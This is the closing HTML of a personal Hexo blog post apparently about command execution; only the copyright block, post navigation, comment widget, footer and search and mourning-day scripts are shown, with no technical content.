</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>kinsey</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://kinseyy.github.io/2024/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="å‘½ä»¤æ‰§è¡Œ">https://kinseyy.github.io/2024/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> unless otherwise stated.</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/10/08/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="ååºåˆ—åŒ–"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">ååºåˆ—åŒ–</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/10/08/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="next" title="ctfshow å‘½ä»¤æ‰§è¡Œ"><span class="post-nav-text">ctfshow å‘½ä»¤æ‰§è¡Œ</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>å¦‚æœæ‚¨æœ‰ä»»ä½•å…³äºåšå®¢å†…å®¹çš„ç›¸å…³è®¨è®ºï¼Œæ¬¢è¿å‰å¾€ <a href="https://github.com/kinseyy/kinseyy.github.io/discussions" target="_blank">GitHub Discussions</a> ä¸æˆ‘äº¤æµã€‚</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2024/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">è‹ICPå¤‡17038157å·</a></div><div class="copyright"><span>&copy; 2023 â€“ 2025 </span><a class="with-love" id="animate" target="_blank" rel="noopener" href="https://github.com/kinseyy" title="Github"><span class="icon iconify" data-icon="ri:github-line"></span></a><span class="author"> kinsey</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v7.2.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="footer-custom-text"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener" title="å¼€å¾€-å‹é“¾æ¥åŠ›"><img src="https://www.travellings.cn/assets/logo.gif" alt="å¼€å¾€-å‹é“¾æ¥åŠ›" width="120"></a></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script defer src="https://fastly.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script><script defer src="https://fastly.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script><script defer src="/js/search/algolia-search.js" type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"></div><div class="algolia-results"><div id="algolia-stats"></div><div id="algolia-hits"></div><div class="algolia-pagination" id="algolia-pagination"></div></div></div><script>function initMourn() {
  const date = new Date();
  const today = (date.getMonth() + 1) + "-" + date.getDate()
  const mourn_days = ["4-4","9-18"]
  if (mourn_days.includes(today)) {
    document.documentElement.style.filter = "grayscale(1)";
  }
}
initMourn();</script></body></html>